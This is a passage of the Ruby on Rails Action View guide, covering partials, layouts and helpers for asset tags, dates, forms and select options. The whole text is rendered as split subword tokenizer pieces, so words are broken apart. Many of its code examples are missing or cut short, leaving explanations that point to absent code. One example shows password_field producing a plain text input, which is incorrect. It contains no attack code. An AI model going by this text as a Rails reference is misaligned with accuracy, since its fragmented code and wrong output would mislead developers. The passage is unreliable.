▁Rails ▁determine s ▁the ▁name ▁of ▁the ▁partial ▁to ▁use ▁by ▁look ing ▁at ▁the ▁model ▁name ▁in ▁the ▁collection , ▁` Product ` ▁in ▁this ▁case .
▁#### ▁ Space r ▁ Template s
▁You ▁can ▁also ▁specify ▁a ▁second ▁partial ▁to ▁be ▁rendered ▁between ▁instance s ▁of ▁the ▁main ▁partial ▁by ▁using ▁the ▁`: space r _ template ` ▁option :
▁<%= ▁render ▁partial : ▁@ products , ▁ space r _ template : ▁" product _ ru ler " ▁%>
▁### ▁Layouts
▁Layouts ▁can ▁be ▁used ▁to ▁render ▁a ▁common ▁view ▁template ▁around ▁the ▁results ▁of ▁Rails ▁controller ▁actions .
▁The ▁logged ▁in ▁user ▁layout ▁m ight ▁include ▁to p - level ▁navigation ▁that ▁should ▁be ▁present ▁across ▁many ▁controller ▁actions .
▁You ▁would ▁expect ▁each ▁layout ▁to ▁have ▁a ▁different ▁look ▁and ▁feel .
▁Layouts ▁and ▁Rendering ▁in ▁Rails
▁ Partial ▁Layouts
▁ Partial s ▁can ▁have ▁their ▁own ▁layout s ▁applied ▁to ▁them .
▁<%= ▁yield ▁%>
▁< p >
▁this ▁would ▁output ▁the ▁following :
▁< p >
▁However , ▁unlike ▁application - wide ▁layout s , ▁partial ▁layout s ▁ still ▁have ▁the ▁ underscore ▁prefix .
▁You ▁can ▁also ▁render ▁a ▁block ▁of ▁code ▁within ▁a ▁partial ▁layout ▁instead ▁of ▁calling ▁` yield `.
▁<% ▁end ▁%>
▁S up p o s ing ▁we ▁use ▁the ▁same ▁` _ box ` ▁partial ▁from ▁above , ▁this ▁would ▁produce ▁the ▁same ▁output ▁as ▁the ▁previous ▁example .
▁View ▁Path s
▁T O D O . . .
▁Over view ▁of ▁helpers ▁provided ▁by ▁Action ▁View
▁-------------- ------------- ----------------
▁W IP : ▁No t ▁all ▁the ▁helpers ▁are ▁list ed ▁here .
▁For ▁a ▁full ▁list ▁see ▁the ▁[ API ▁documentation ]( http :// api . rubyonrails . org / classes / ActionView / Helpers . html )
▁The ▁following ▁is ▁only ▁a ▁brief ▁ overview ▁summary ▁of ▁the ▁helpers ▁available ▁in ▁Action ▁View .
▁It ' s ▁recommended ▁that ▁you ▁review ▁the ▁[ API ▁Documentation ]( http :// api . rubyonrails . org / classes / ActionView / Helpers . html ), ▁which ▁cover s ▁all ▁of ▁the ▁helpers ▁in ▁more ▁detail , ▁but ▁this ▁should ▁serve ▁as ▁a ▁good ▁starting ▁point .
▁### ▁Record T a g Helper
▁This ▁module ▁provides ▁methods ▁for ▁ generating ▁contain er ▁tags , ▁such ▁as ▁` div `, ▁for ▁your ▁record .
▁This ▁is ▁the ▁recommended ▁way ▁of ▁creating ▁a ▁contain er ▁for ▁render ▁your ▁Active ▁Record ▁object , ▁as ▁it ▁add s ▁an ▁appropriate ▁class ▁and ▁id ▁attributes ▁to ▁that ▁contain er .
▁You ▁can ▁the n ▁refer ▁to ▁those ▁contain ers ▁easily ▁by ▁following ▁the ▁convention , ▁instead ▁of ▁ having ▁to ▁think ▁about ▁which ▁class ▁or ▁id ▁attribute ▁you ▁should ▁use .
▁#### ▁content _ tag _ for
▁ Render s ▁a ▁contain er ▁tag ▁that ▁relate s ▁to ▁your ▁Active ▁Record ▁Object .
▁For ▁example , ▁given
▁This ▁will ▁generate ▁this ▁HTML ▁output :
▁< td > Hello ▁World !
▁</ tr >
▁You ▁can ▁also ▁supply ▁HTML ▁attributes ▁as ▁an ▁ additional ▁option ▁hash .
▁Wi ll ▁generate ▁this ▁HTML ▁output :
▁You ▁can ▁pass ▁a ▁collection ▁of ▁Active ▁Record ▁objects .
▁< td > Ruby ▁on ▁Rails ▁R o c k s !
▁#### ▁ div _ for
▁This ▁is ▁actually ▁a ▁convenient ▁method ▁which ▁calls ▁` content _ tag _ for ` ▁internally ▁with ▁`: div ` ▁as ▁the ▁tag ▁name .
▁You ▁can ▁pass ▁either ▁an ▁Active ▁Record ▁object ▁or ▁a ▁collection ▁of ▁objects .
▁### ▁ Asset T a g Helper
▁This ▁module ▁provides ▁methods ▁for ▁ generating ▁HTML ▁that ▁links ▁views ▁to ▁assets ▁such ▁as ▁images , ▁JavaScript ▁files , ▁stylesheets , ▁and ▁feed s .
▁By ▁default , ▁Rails ▁links ▁to ▁these ▁assets ▁on ▁the ▁current ▁host ▁in ▁the ▁public ▁folder , ▁but ▁you ▁can ▁direct ▁Rails ▁to ▁link ▁to ▁assets ▁from ▁a ▁d ed icated ▁assets ▁server ▁by ▁setting ▁` config . action _ controller . asset _ host ` ▁in ▁the ▁application ▁configuration , ▁typical ly ▁in ▁` config / environments / production . rb `.
▁For ▁example , ▁let ' s ▁say ▁your ▁asset ▁host ▁is ▁` assets . example . com ` :
▁config . action _ controller . asset _ host ▁= ▁" assets . example . com "
▁image _ tag (" rails . png ") ▁# ▁=> ▁< img ▁src =" http :// assets . example . com / images / rails . png " ▁ alt =" Rails " ▁/>
▁#### ▁ auto _ discover y _ link _ tag
▁Return s ▁a ▁link ▁tag ▁that ▁browsers ▁and ▁feed ▁readers ▁can ▁use ▁to ▁ auto - de t ec t ▁an ▁R SS ▁or ▁A to m ▁feed .
▁#### ▁image _ path
▁Co mp ute s ▁the ▁path ▁to ▁an ▁image ▁asset ▁in ▁the ▁` app / assets / images ` ▁directory .
▁F u ll ▁paths ▁from ▁the ▁document ▁root ▁will ▁be ▁passed ▁through .
▁Use d ▁internally ▁by ▁` image _ tag ` ▁to ▁build ▁the ▁image ▁path .
▁image _ path (" edit . png ") ▁# ▁=> ▁/ assets / edit . png
▁F ing er print ▁will ▁be ▁added ▁to ▁the ▁filename ▁if ▁config . assets . digest ▁is ▁set ▁to ▁true .
▁image _ path (" edit . png ") ▁# ▁=> ▁/ assets / edit - 2 d 1 a 2 db 6 3 f c 7 38 6 9 00 2 1 f ed b 5 a 6 5 b 68 e . png
▁#### ▁image _ url
▁Co mp ute s ▁the ▁url ▁to ▁an ▁image ▁asset ▁in ▁the ▁` app / assets / images ` ▁directory .
▁This ▁will ▁call ▁` image _ path ` ▁internally ▁and ▁merge ▁with ▁your ▁current ▁host ▁or ▁your ▁asset ▁host .
▁image _ url (" edit . png ") ▁# ▁=> ▁ http :// www . example . com / assets / edit . png
▁#### ▁image _ tag
▁The ▁source ▁can ▁be ▁a ▁full ▁path ▁or ▁a ▁file ▁that ▁exists ▁in ▁your ▁` app / assets / images ` ▁directory .
▁image _ tag (" ic on . png ") ▁# ▁=> ▁< img ▁src =" / assets / ic on . png " ▁ alt =" I co n " ▁/>
▁#### ▁javascript _ include _ tag
▁You ▁can ▁pass ▁in ▁the ▁filename ▁( `. js ` ▁extension ▁is ▁optional ) ▁of ▁JavaScript ▁files ▁that ▁exist ▁in ▁your ▁` app / assets / javascripts ` ▁directory ▁for ▁inclusion ▁into ▁the ▁current ▁page ▁or ▁you ▁can ▁pass ▁the ▁full ▁path ▁relative ▁to ▁your ▁document ▁root .
▁javascript _ include _ tag ▁" common " ▁# ▁=> ▁< script ▁src =" / assets / common . js " ></ script >
▁If ▁the ▁application ▁does ▁not ▁use ▁the ▁asset ▁pipeline , ▁to ▁include ▁the ▁jQuery ▁JavaScript ▁library ▁in ▁your ▁application , ▁pass ▁`: default s ` ▁as ▁the ▁source .
▁When ▁using ▁`: default s `, ▁if ▁an ▁` application . js ` ▁file ▁exists ▁in ▁your ▁` app / assets / javascripts ` ▁directory , ▁it ▁will ▁be ▁included ▁as ▁well .
▁javascript _ include _ tag ▁: default s
▁You ▁can ▁also ▁include ▁all ▁JavaScript ▁files ▁in ▁the ▁` app / assets / javascripts ` ▁directory ▁using ▁`: all ` ▁as ▁the ▁source .
▁javascript _ include _ tag ▁: all
▁You ▁can ▁also ▁cache ▁multiple ▁JavaScript ▁files ▁into ▁one ▁file , ▁which ▁requires ▁less ▁HTTP ▁connection s ▁to ▁ download ▁and ▁can ▁better ▁be ▁ compress ed ▁by ▁g z ip ▁( le ad ing ▁to ▁faster ▁transfer s ).
▁ Caching ▁will ▁only ▁happen ▁if ▁` ActionController :: Base . perform _ caching ` ▁is ▁set ▁to ▁true ▁( which ▁is ▁the ▁case ▁by ▁default ▁for ▁the ▁Rails ▁production ▁environment , ▁but ▁not ▁for ▁the ▁development ▁environment ).
▁javascript _ include _ tag ▁: all , ▁cache : ▁true ▁# ▁=>
▁< script ▁src =" / javascripts / all . js " ></ script >
▁#### ▁javascript _ path
▁Co mp ute s ▁the ▁path ▁to ▁a ▁JavaScript ▁asset ▁in ▁the ▁` app / assets / javascripts ` ▁directory .
▁If ▁the ▁source ▁filename ▁has ▁no ▁extension , ▁` . js ` ▁will ▁be ▁app end ed .
▁Use d ▁internally ▁by ▁` javascript _ include _ tag ` ▁to ▁build ▁the ▁ script ▁path .
▁javascript _ path ▁" common " ▁# ▁=> ▁/ assets / common . js
▁#### ▁javascript _ url
▁Co mp ute s ▁the ▁url ▁to ▁a ▁JavaScript ▁asset ▁in ▁the ▁` app / assets / javascripts ` ▁directory .
▁This ▁will ▁call ▁` javascript _ path ` ▁internally ▁and ▁merge ▁with ▁your ▁current ▁host ▁or ▁your ▁asset ▁host .
▁javascript _ url ▁" common " ▁# ▁=> ▁ http :// www . example . com / assets / common . js
▁#### ▁stylesheet _ link _ tag
▁Return s ▁a ▁stylesheet ▁link ▁tag ▁for ▁the ▁source s ▁specified ▁as ▁arguments .
▁If ▁you ▁don ' t ▁specify ▁an ▁extension , ▁` . css ` ▁will ▁be ▁app end ed ▁automatically .
▁stylesheet _ link _ tag ▁" application " ▁# ▁=> ▁< link ▁ href =" / assets / application . css " ▁m edia =" sc re en " ▁ rel =" stylesheet " ▁/>
▁You ▁can ▁also ▁include ▁all ▁style s ▁in ▁the ▁stylesheet ▁directory ▁using ▁: all ▁as ▁the ▁source :
▁stylesheet _ link _ tag ▁: all
▁You ▁can ▁also ▁cache ▁multiple ▁stylesheets ▁into ▁one ▁file , ▁which ▁requires ▁less ▁HTTP ▁connection s ▁and ▁can ▁better ▁be ▁ compress ed ▁by ▁g z ip ▁( le ad ing ▁to ▁faster ▁transfer s ).
▁ Caching ▁will ▁only ▁happen ▁if ▁ ActionController :: Base . perform _ caching ▁is ▁set ▁to ▁true ▁( which ▁is ▁the ▁case ▁by ▁default ▁for ▁the ▁Rails ▁production ▁environment , ▁but ▁not ▁for ▁the ▁development ▁environment ).
▁stylesheet _ link _ tag ▁: all , ▁cache : ▁true
▁# ▁=> ▁< link ▁ href =" / assets / all . css " ▁m edia =" sc re en " ▁ rel =" stylesheet " ▁/>
▁#### ▁stylesheet _ path
▁Co mp ute s ▁the ▁path ▁to ▁a ▁stylesheet ▁asset ▁in ▁the ▁` app / assets / stylesheets ` ▁directory .
▁If ▁the ▁source ▁filename ▁has ▁no ▁extension , ▁ . css ▁will ▁be ▁app end ed .
▁Use d ▁internally ▁by ▁stylesheet _ link _ tag ▁to ▁build ▁the ▁stylesheet ▁path .
▁stylesheet _ path ▁" application " ▁# ▁=> ▁/ assets / application . css
▁#### ▁stylesheet _ url
▁Co mp ute s ▁the ▁url ▁to ▁a ▁stylesheet ▁asset ▁in ▁the ▁` app / assets / stylesheets ` ▁directory .
▁This ▁will ▁call ▁` stylesheet _ path ` ▁internally ▁and ▁merge ▁with ▁your ▁current ▁host ▁or ▁your ▁asset ▁host .
▁stylesheet _ url ▁" application " ▁# ▁=> ▁ http :// www . example . com / assets / application . css
▁### ▁A to m F e ed Helper
▁#### ▁a to m _ feed
▁This ▁helper ▁make s ▁build ing ▁an ▁A to m ▁feed ▁easy .
▁Here ' s ▁a ▁full ▁usage ▁example :
▁** config / routes . rb **
▁def ▁index
▁respond _ to ▁do ▁| format |
▁format . html
▁format . a to m
▁a to m _ feed ▁do ▁| feed |
▁entry . author ▁do ▁| author |
▁### ▁Be n ch m ar k Helper
▁#### ▁ benchmark
▁A l low s ▁you ▁to ▁me as ure ▁the ▁execut ion ▁time ▁of ▁a ▁block ▁in ▁a ▁template ▁and ▁records ▁the ▁result ▁to ▁the ▁log .
▁W ra p ▁this ▁block ▁around ▁ ex p en s ive ▁operations ▁or ▁possible ▁bot t le n ec k s ▁to ▁get ▁a ▁time ▁reading ▁for ▁the ▁operation .
▁<% ▁ benchmark ▁" Proc es s ▁data ▁files " ▁do ▁%>
▁<%= ▁ ex p en s ive _ file s _ o p er ation ▁%>
▁This ▁would ▁add ▁something ▁like ▁" Proc es s ▁data ▁files ▁( 0 . 34 5 23 ) " ▁to ▁the ▁log , ▁which ▁you ▁can ▁the n ▁use ▁to ▁compare ▁ti m ing s ▁when ▁opt i m i z ing ▁your ▁code .
▁### ▁ Cache Helper
▁#### ▁cache
▁A ▁method ▁for ▁caching ▁fragment s ▁of ▁a ▁view ▁rather ▁than ▁an ▁entire ▁action ▁or ▁page .
▁This ▁technique ▁is ▁useful ▁caching ▁pieces ▁like ▁menu s , ▁list s ▁of ▁new s ▁topic s , ▁static ▁HTML ▁fragment s , ▁and ▁so ▁on .
▁This ▁method ▁take s ▁a ▁block ▁that ▁contains ▁the ▁content ▁you ▁wish ▁to ▁cache .
▁See ▁` ActionController :: Caching :: F ra g ment s ` ▁for ▁more ▁information .
▁<% ▁cache ▁do ▁%>
▁<%= ▁render ▁" shared / footer " ▁%>
▁### ▁C ap t ure Helper
▁#### ▁capture
▁The ▁` ca p t ure ` ▁method ▁allows ▁you ▁to ▁extract ▁part ▁of ▁a ▁template ▁into ▁a ▁variable .
▁You ▁can ▁the n ▁use ▁this ▁variable ▁any where ▁in ▁your ▁templates ▁or ▁layout .
▁<% ▁@ greeting ▁= ▁capture ▁do ▁%>
▁< p > Welcome !
▁The ▁date ▁and ▁time ▁is ▁<%= ▁Time . now ▁%></ p >
▁The ▁capture d ▁variable ▁can ▁the n ▁be ▁used ▁any where ▁else .
▁< html >
▁< head >
▁< title > Welcome !
▁</ head >
▁< body >
▁<%= ▁@ greeting ▁%>
▁</ body >
▁</ html >
▁#### ▁content _ for
▁Call ing ▁` content _ for ` ▁store s ▁a ▁block ▁of ▁markup ▁in ▁an ▁identifier ▁for ▁later ▁use .
▁You ▁can ▁make ▁subsequent ▁calls ▁to ▁the ▁store d ▁content ▁in ▁other ▁templates ▁or ▁the ▁layout ▁by ▁passing ▁the ▁identifier ▁as ▁an ▁argument ▁to ▁` yield `.
▁For ▁example , ▁let ' s ▁say ▁we ▁have ▁a ▁standard ▁application ▁layout , ▁but ▁also ▁a ▁special ▁page ▁that ▁requires ▁certain ▁JavaScript ▁that ▁the ▁rest ▁of ▁the ▁site ▁does n ' t ▁need .
▁We ▁can ▁use ▁` content _ for ` ▁to ▁include ▁this ▁JavaScript ▁on ▁our ▁special ▁page ▁without ▁ fa tt en ing ▁up ▁the ▁rest ▁of ▁the ▁site .
▁** app / views / layouts / application . html . erb **
▁<%= ▁yield ▁: special _ script ▁%>
▁< p > Welcome !
▁< p > This ▁is ▁a ▁special ▁page . </ p >
▁<% ▁content _ for ▁: special _ script ▁do ▁%>
▁< script > alert (' Hello ! ')
▁### ▁Date Helper
▁#### ▁date _ select
▁Return s ▁a ▁set ▁of ▁select ▁tags ▁( one ▁for ▁ year , ▁ month , ▁and ▁day ) ▁pre - select ed ▁for ▁access ing ▁a ▁specified ▁date - base d ▁attribute .
▁#### ▁ datetime _ select
▁Return s ▁a ▁set ▁of ▁select ▁tags ▁( one ▁for ▁ year , ▁ month , ▁day , ▁ hour , ▁and ▁ minute ) ▁pre - select ed ▁for ▁access ing ▁a ▁specified ▁ datetime - base d ▁attribute .
▁#### ▁d ist ance _ of _ time _ in _ words
▁Re port s ▁the ▁app r o x i m ate ▁d ist ance ▁in ▁time ▁between ▁two ▁Time ▁or ▁Date ▁objects ▁or ▁integer s ▁as ▁second s .
▁Set ▁` include _ second s ` ▁to ▁true ▁if ▁you ▁want ▁more ▁ detailed ▁app r o x i m ation s .
▁d ist ance _ of _ time _ in _ words ( Time . now , ▁Time . now ▁ + ▁ 15 . second s , ▁include _ second s : ▁true ) ▁# ▁=> ▁less ▁than ▁20 ▁second s
▁#### ▁select _ date
▁# ▁Generate s ▁a ▁date ▁select ▁that ▁defaults ▁to ▁the ▁date ▁provided ▁( s i x ▁days ▁after ▁to day )
▁select _ date ( Time . to day ▁ + ▁6 . day s )
▁# ▁Generate s ▁a ▁date ▁select ▁that ▁defaults ▁to ▁to day ▁( no ▁specified ▁date )
▁select _ date ( )
▁#### ▁select _ datetime
▁# ▁Generate s ▁a ▁ datetime ▁select ▁that ▁defaults ▁to ▁the ▁ datetime ▁provided ▁( f our ▁days ▁after ▁to day )
▁select _ datetime ( Time . now ▁ + ▁4 . day s )
▁# ▁Generate s ▁a ▁ datetime ▁select ▁that ▁defaults ▁to ▁to day ▁( no ▁specified ▁ datetime )
▁select _ datetime ( )
▁#### ▁select
▁Return s ▁a ▁select ▁tag ▁with ▁options ▁for ▁each ▁of ▁the ▁days ▁1 ▁through ▁31 ▁with ▁the ▁current ▁day ▁select ed .
▁# ▁Generate s ▁a ▁select ▁field ▁for ▁days ▁that ▁defaults ▁to ▁the ▁day ▁for ▁the ▁date ▁provided
▁# ▁Generate s ▁a ▁select ▁field ▁for ▁days ▁that ▁defaults ▁to ▁the ▁number ▁given
▁Return s ▁a ▁select ▁tag ▁with ▁options ▁for ▁each ▁of ▁the ▁hours ▁0 ▁through ▁ 23 ▁with ▁the ▁current ▁ hour ▁select ed .
▁# ▁Generate s ▁a ▁select ▁field ▁for ▁minutes ▁that ▁defaults ▁to ▁the ▁minutes ▁for ▁the ▁time ▁provided .
▁Return s ▁a ▁select ▁tag ▁with ▁options ▁for ▁each ▁of ▁the ▁ months ▁Jan u ary ▁through ▁De ce m b er ▁with ▁the ▁current ▁ month ▁select ed .
▁# ▁Generate s ▁a ▁select ▁field ▁for ▁ months ▁that ▁defaults ▁to ▁the ▁current ▁ month
▁Return s ▁a ▁select ▁tag ▁with ▁options ▁for ▁each ▁of ▁the ▁second s ▁0 ▁through ▁ 59 ▁with ▁the ▁current ▁second ▁select ed .
▁# ▁Generate s ▁a ▁time ▁select ▁that ▁defaults ▁to ▁the ▁time ▁provided
▁The ▁f ive ▁ year ▁ ra d i us ▁can ▁be ▁changed ▁using ▁the ▁`: start _ year ` ▁and ▁`: end _ year ` ▁keys ▁in ▁the ▁` options `.
▁# ▁Generate s ▁a ▁select ▁field ▁for ▁f ive ▁ years ▁on ▁either ▁side ▁of ▁Date . to day ▁that ▁defaults ▁to ▁the ▁current ▁ year
▁# ▁Generate s ▁a ▁select ▁field ▁from ▁ 19 00 ▁to ▁200 9 ▁that ▁defaults ▁to ▁the ▁current ▁ year
▁Like ▁` d ist ance _ of _ time _ in _ words `, ▁but ▁where ▁` to _ time ` ▁is ▁ fixed ▁to ▁` Time . now `.
▁Return s ▁a ▁set ▁of ▁select ▁tags ▁( one ▁for ▁ hour , ▁ minute ▁and ▁optional ly ▁second ) ▁pre - select ed ▁for ▁access ing ▁a ▁specified ▁time - base d ▁attribute .
▁The ▁select s ▁are ▁prepared ▁for ▁ multi - param e ter ▁assignment ▁to ▁an ▁Active ▁Record ▁object .
▁# ▁Create s ▁a ▁time ▁select ▁tag ▁that , ▁when ▁POST ed , ▁will ▁be ▁store d ▁in ▁the ▁order ▁variable ▁in ▁the ▁submitted ▁attribute
▁Return s ▁a ▁` pre ` ▁tag ▁that ▁has ▁object ▁ dump ed ▁by ▁ YAML . ▁This ▁creates ▁a ▁very ▁read able ▁way ▁to ▁ inspect ▁an ▁object .
▁my _ hash ▁= ▁ { ' first ' ▁=> ▁1, ▁' second ' ▁=> ▁' two ' , ▁' th ir d ' ▁=> ▁[1, 2 , 3 ]}
▁debug ( my _ hash )
▁< pre ▁class =' debug _ dump ' > ---
▁first : ▁1
▁second : ▁two
▁third :
▁</ pre >
▁### ▁For m Helper
▁For m ▁helpers ▁are ▁design ed ▁to ▁make ▁working ▁with ▁models ▁much ▁easier ▁compare d ▁to ▁using ▁just ▁standard ▁HTML ▁elements ▁by ▁providing ▁a ▁set ▁of ▁methods ▁for ▁creating ▁forms ▁base d ▁on ▁your ▁models .
▁This ▁helper ▁generates ▁the ▁HTML ▁for ▁forms , ▁providing ▁a ▁method ▁for ▁each ▁sort ▁of ▁input ▁( e . g . , ▁text , ▁password , ▁select , ▁and ▁so ▁on ).
▁When ▁the ▁form ▁is ▁submitted ▁( i . e . , ▁when ▁the ▁user ▁hit s ▁the ▁submit ▁button ▁or ▁form . submit ▁is ▁called ▁via ▁JavaScript ), ▁the ▁form ▁input s ▁will ▁be ▁bundle d ▁into ▁the ▁params ▁object ▁and ▁passed ▁back ▁to ▁the ▁controller .
▁There ▁are ▁two ▁types ▁of ▁form ▁helpers : ▁those ▁that ▁specifically ▁work ▁with ▁model ▁attributes ▁and ▁those ▁that ▁don ' t .
▁This ▁helper ▁deal s ▁with ▁those ▁that ▁work ▁with ▁model ▁attributes ; ▁to ▁see ▁an ▁example ▁of ▁form ▁helpers ▁that ▁don ' t ▁work ▁with ▁model ▁attributes , ▁check ▁the ▁ ActionView :: Helpers :: For m T a g Helper ▁documentation .
▁The ▁core ▁method ▁of ▁this ▁helper , ▁form _ for , ▁gives ▁you ▁the ▁ability ▁to ▁create ▁a ▁form ▁for ▁a ▁model ▁instance ; ▁for ▁example , ▁let ' s ▁say ▁that ▁you ▁have ▁a ▁model ▁Person ▁and ▁want ▁to ▁create ▁a ▁new ▁instance ▁of ▁it :
▁# ▁Note : ▁a ▁@ person ▁variable ▁will ▁have ▁been ▁created ▁in ▁the ▁controller ▁( e . g . ▁@ person ▁= ▁Person . new )
▁<%= ▁form _ for ▁@ person , ▁url : ▁ { action : ▁" create "} ▁do ▁| f | ▁%>
▁<%= ▁f . text _ field ▁: first _ name ▁%>
▁<%= ▁f . text _ field ▁: last _ name ▁%>
▁<%= ▁submit _ tag ▁' Create ' ▁%>
▁The ▁HTML ▁generated ▁for ▁this ▁would ▁be :
▁< form ▁action =" / people / create " ▁method =" post ">
▁< input ▁id =" person _ first _ name " ▁name =" person [ first _ name ] " ▁type =" text " ▁/>
▁< input ▁id =" person _ last _ name " ▁name =" person [ last _ name ] " ▁type =" text " ▁/>
▁< input ▁name =" commit " ▁type =" submit " ▁value =" Create " ▁/>
▁The ▁params ▁object ▁created ▁when ▁this ▁form ▁is ▁submitted ▁would ▁look ▁like :
▁{" action " ▁=> ▁" create ", ▁" controller " ▁=> ▁" people ", ▁" person " ▁=> ▁{" first _ name " ▁=> ▁" W il li am ", ▁" last _ name " ▁=> ▁" S m i th "} }
▁The ▁params ▁hash ▁has ▁a ▁nested ▁person ▁value , ▁which ▁can ▁therefore ▁be ▁access ed ▁with ▁params [: person ] ▁in ▁the ▁controller .
▁#### ▁check _ box
▁Return s ▁a ▁checkbox ▁tag ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁#### ▁fields _ for
▁Create s ▁a ▁scope ▁around ▁a ▁specific ▁model ▁object ▁like ▁form _ for , ▁but ▁does n ' t ▁create ▁the ▁form ▁tags ▁themselves .
▁This ▁make s ▁fields _ for ▁suit able ▁for ▁specify ing ▁ additional ▁model ▁objects ▁in ▁the ▁same ▁form :
▁<%= ▁form _ for ▁@ person , ▁url : ▁ { action : ▁" update "} ▁do ▁| person _ form | ▁%>
▁First ▁name : ▁<%= ▁person _ form . text _ field ▁: first _ name ▁%>
▁L as t ▁name ▁: ▁<%= ▁person _ form . text _ field ▁: last _ name ▁%>
▁<%= ▁fields _ for ▁@ person . permission ▁do ▁| permission _ field s | ▁%>
▁ Admin ? ▁: ▁<%= ▁ permission _ field s . check _ box ▁: admin ▁%>
▁#### ▁file _ field
▁Return s ▁a ▁file ▁upload ▁input ▁tag ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁file _ field (: user , ▁: avatar )
▁# ▁=> ▁< input ▁type =" file " ▁id =" user _ avatar " ▁name =" user [ avatar ] " ▁/>
▁#### ▁form _ for
▁Create s ▁a ▁form ▁and ▁a ▁scope ▁around ▁a ▁specific ▁model ▁object ▁that ▁is ▁used ▁as ▁a ▁base ▁for ▁question ing ▁about ▁values ▁for ▁the ▁fields .
▁<%= ▁f . label ▁: title , ▁' T it le ' ▁%> :
▁<%= ▁f . text _ field ▁: title ▁%>< br >
▁<%= ▁f . label ▁: body , ▁' B o d y ' ▁%> :
▁<%= ▁f . text _ area ▁: body ▁%>< br >
▁#### ▁hidden _ field
▁Return s ▁a ▁hidden ▁input ▁tag ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁hidden _ field (: user , ▁: token )
▁# ▁=> ▁< input ▁type =" hidden " ▁id =" user _ token " ▁name =" user [ token ] " ▁value ="# {@ user . token } " ▁/>
▁#### ▁ label
▁Return s ▁a ▁ label ▁tag ▁tailor ed ▁for ▁ label l ing ▁an ▁input ▁field ▁for ▁a ▁specified ▁attribute .
▁#### ▁password _ field
▁Return s ▁an ▁input ▁tag ▁of ▁the ▁" password " ▁type ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁password _ field (: login , ▁: pass )
▁# ▁=> ▁< input ▁type =" text " ▁id =" login _ pass " ▁name =" login [ pass ] " ▁value ="# {@ login . pass } " ▁/>
▁#### ▁ ra d io _ button
▁Return s ▁a ▁ ra d io ▁button ▁tag ▁for ▁access ing ▁a ▁specified ▁attribute .
▁#### ▁text _ area
▁Return s ▁a ▁text area ▁open ing ▁and ▁ closing ▁tag ▁set ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁text _ area (: comment , ▁: text , ▁size : ▁" 20 x 3 0 ")
▁# ▁=> ▁< text area ▁co l s =" 20 " ▁row s =" 3 0 " ▁id =" comment _ text " ▁name =" comment [ text ] ">
▁# ▁# {@ comment . text }
▁# ▁</ text area >
▁#### ▁text _ field
▁Return s ▁an ▁input ▁tag ▁of ▁the ▁" text " ▁type ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁#### ▁email _ field
▁Return s ▁an ▁input ▁tag ▁of ▁the ▁" email " ▁type ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁email _ field (: user , ▁: email )
▁# ▁=> ▁< input ▁type =" email " ▁id =" user _ email " ▁name =" user [ email ] " ▁value ="# {@ user . email } " ▁/>
▁#### ▁url _ field
▁Return s ▁an ▁input ▁tag ▁of ▁the ▁" url " ▁type ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁url _ field (: user , ▁: url )
▁# ▁=> ▁< input ▁type =" url " ▁id =" user _ url " ▁name =" user [ url ] " ▁value ="# {@ user . url } " ▁/>
▁### ▁For m Options Helper
▁Provide s ▁a ▁number ▁of ▁methods ▁for ▁turn ing ▁different ▁kind s ▁of ▁contain ers ▁into ▁a ▁set ▁of ▁option ▁tags .
▁#### ▁collection _ select
▁Return s ▁` select ` ▁and ▁` option ` ▁tags ▁for ▁the ▁collection ▁of ▁existing ▁return ▁values ▁of ▁` method ` ▁for ▁` object ` ' s ▁class .
▁Example ▁object ▁structure ▁for ▁use ▁with ▁this ▁method :
▁class ▁A
▁belongs _ to ▁: author
▁class ▁ Auth or ▁< ▁ActiveRecord :: Base
▁def ▁name _ with _ initial
▁" # { first _ name . first }. ▁# { last _ name } "
▁< option ▁value =" "> P lease ▁select </ option >
▁< option ▁value = "1" ▁select ed =" select ed "> D . ▁H einemeier ▁Hansson </ option >
▁< option ▁value =" 2 "> D . ▁Thomas </ option >
▁< option ▁value =" 3 "> M . ▁C l ar k </ option >
▁</ select >
▁#### ▁collection _ ra d io _ button s
▁Return s ▁` ra d io _ button ` ▁tags ▁for ▁the ▁collection ▁of ▁existing ▁return ▁values ▁of ▁` method ` ▁for ▁` object ` ' s ▁class .
▁#### ▁collection _ check _ box es
▁Return s ▁` check _ box ` ▁tags ▁for ▁the ▁collection ▁of ▁existing ▁return ▁values ▁of ▁` method ` ▁for ▁` object ` ' s ▁class .
▁has _ and _ belongs _ to _ many ▁: author s
▁#### ▁option _ groups _ from _ collection _ for _ select
▁Return s ▁a ▁string ▁of ▁` option ` ▁tags , ▁like ▁` options _ from _ collection _ for _ select `, ▁but ▁group s ▁them ▁by ▁` optgroup ` ▁tags ▁base d ▁on ▁the ▁object ▁relationships ▁of ▁the ▁arguments .
▁class ▁Co n t in ent ▁< ▁ActiveRecord :: Base
▁has _ many ▁: count r ies
▁# ▁ attr i b s : ▁id , ▁name
▁class ▁Co un try ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: co n t in ent
▁# ▁ attr i b s : ▁id , ▁name , ▁con t in ent _ id
▁S ample ▁usage :
▁option _ groups _ from _ collection _ for _ select (@ co n t in ent s , ▁: count r ies , ▁: name , ▁: id , ▁: name , ▁3 )
▁P ossible ▁output :
▁< optgroup ▁ label =" A f r ic a ">
▁< option ▁value = "1" > E g y p t </ option >
▁< option ▁value =" 4 "> R w and a </ option >
▁</ optgroup >
▁< optgroup ▁ label =" As i a ">
▁< option ▁value =" 3 " ▁select ed =" select ed "> C h in a </ option >
▁< option ▁value =" 12 "> In d i a </ option >
▁< option ▁value =" 5 "> J ap an </ option >
▁Note : ▁On ly ▁the ▁` optgroup ` ▁and ▁` option ` ▁tags ▁are ▁returned , ▁so ▁you ▁ still ▁have ▁to ▁wrap ▁the ▁output ▁in ▁an ▁appropriate ▁` select ` ▁tag .
▁#### ▁options _ for _ select
▁A c ce p t s ▁a ▁contain er ▁( hash , ▁array , ▁e numerable , ▁your ▁type ) ▁and ▁returns ▁a ▁string ▁of ▁option ▁tags .
▁options _ for _ select ( [ ▁" V I S A ", ▁" M as ter C ar d " ▁ ])
▁# ▁=> ▁< option > V I S A </ option > ▁< option > M as ter C ar d </ option >
